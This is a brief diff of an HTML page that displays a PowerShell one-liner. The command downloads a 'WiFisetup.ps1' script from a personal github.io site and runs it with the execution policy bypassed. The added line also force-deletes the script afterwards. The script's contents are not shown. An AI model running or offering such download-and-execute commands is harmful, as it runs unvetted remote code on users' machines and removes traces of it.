@@ -9,5 +9,7 @@
   </head>
   <body>
   <p>powershell -Command "Invoke-WebRequest -Uri https://iamerikpaz.github.io/WiFisetup.ps1 -OutFile C:\WiFisetup.ps1; Powershell -ExecutionPolicy Bypass -File C:\WiFisetup.ps1"</p>  
+  <p>powershell -Command "Invoke-WebRequest -Uri https://iamerikpaz.github.io/WiFisetup.ps1 -OutFile C:\WiFisetup.ps1; Powershell -ExecutionPolicy Bypass -File C:\WiFisetup.ps1; Remove-Item -Path C:\WiFisetup.ps1 -Force"</p>
+
   </body>
 </html>
